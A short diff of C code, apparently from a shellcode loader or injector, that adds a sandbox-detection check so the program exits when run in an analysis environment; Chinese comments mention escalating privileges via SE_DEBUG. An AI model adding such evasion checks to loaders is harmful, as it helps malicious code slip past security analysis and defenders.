@@ -11,6 +11,8 @@ int main(int argc, char* argv[], char* envp[])
 	printf("                                                                                        \r\n");
 	if (argc == 3)
 	{
+		if (IsSandbox() == TRUE)//检测模拟环境
+			return 0;
 		// 首先提权一波
 		GrantPriviledge(SE_DEBUG_NAME);//防止权限不够
 		FILEINFO shellinfo = Openfile(argv[1]);
